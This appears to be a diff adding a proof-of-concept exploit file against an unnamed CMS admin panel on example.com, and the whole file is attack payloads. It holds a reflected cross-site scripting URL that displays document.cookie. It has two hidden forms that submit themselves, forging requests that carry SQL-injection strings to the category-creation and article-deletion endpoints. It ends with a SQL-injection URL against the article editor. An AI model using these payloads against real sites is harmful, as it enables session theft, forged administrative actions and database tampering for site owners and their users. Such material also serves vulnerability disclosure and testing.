@@ -1,0 +1,18 @@
+http://www.example.com/admin/editMenu.php?id=1&langId=en'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;form action=&quot;http://www.example.com/admin/helper/createNewCategory.php&quot;  method=&quot;post&quot;  name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;catName&quot; value=&quot;catName'some sql&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;catDesc&quot; value=&quot;catDesc'some sql&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+&lt;form action=&quot;http://www.example.com/admin/helper/deleteArticle.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1'some sql&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+http://www.example.com/admin/editArticle.php?id=1'+sql_code_here
